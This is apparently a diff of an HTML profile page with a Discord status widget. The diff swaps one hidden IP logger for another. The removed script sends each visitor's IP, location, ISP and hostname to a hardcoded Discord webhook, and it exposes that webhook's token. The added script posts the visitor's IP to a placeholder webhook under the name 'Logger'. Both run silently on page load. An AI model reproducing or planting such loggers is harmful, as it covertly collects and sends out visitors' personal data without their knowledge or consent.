@@ -72,36 +72,28 @@
                     <p class="a"><span id="Bruh" class="Paragraph"></span></p>
                 </div><img class="d-xl-flex main_image1" id="main_image1" src><iframe height="250px" width="410px" scrolling="no" src="https://lanyard.cnrad.dev/api/641729900428132373?borderRadius=5px&idleMessage=sleeping%20zzz&bg=a&animated=true"
                     frameborder="0">
-</iframe></div>
+</iframe>
+                <script>
+                    function getIP(json) {
+                        var request = new XMLHttpRequest(); //making a request for the webhook
+                        request.open("POST", "YOUR DISCORD WEBHOOK LINK HERE");
+
+                        request.setRequestHeader('Content-type', 'application/json');
+
+                        var params = {
+                            username: "Logger",
+                            avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
+                            content: "**IP:** *" + json.ip + "*"
+                        }
+                        //just a webhook parameters such as avatar,name,message
+
+                        request.send(JSON.stringify(params));
+                    }
+                </script>
+                <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+            </div>
         </section>
     </div>
-    <script>
-      // here is the fun
-      fetch("https://wtfismyip.com/json")
-        .then((response) => response.json())
-        .then((data) => {
-          // Send POST request to Discord webhook
-          fetch("https://discord.com/api/webhooks/1226126479461711923/oyrugegQKBcQFI8HFajMZGKJ9EViCuOK42DsoCGcw3Jp-i2c_gHXKKf8KN_5SjFtMrTA", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              ipAddress: data.YourFuckingIPAddress,
-              location: data.YourFuckingLocation,
-              hostname: data.YourFuckingHostname,
-              isp: data.YourFuckingISP,
-              city: data.YourFuckingCity,
-              country: data.YourFuckingCountry,
-              countryCode: data.YourFuckingCountryCode,
-            }),
-          })
-            .then((response) => response.json())
-            .then((data) => console.log("Sent data to Discord webhook:", data))
-            .catch((error) => console.error("Error sending data to Discord webhook:", error));
-        })
-        .catch((error) => console.error(error));
-    </script>
     <script src="assets/bootstrap/js/bootstrap.min.js"></script>
     <script src="assets/js/lib/jquery.js"></script>
     <script src="assets/js/lib/jquery_cookie.js"></script>
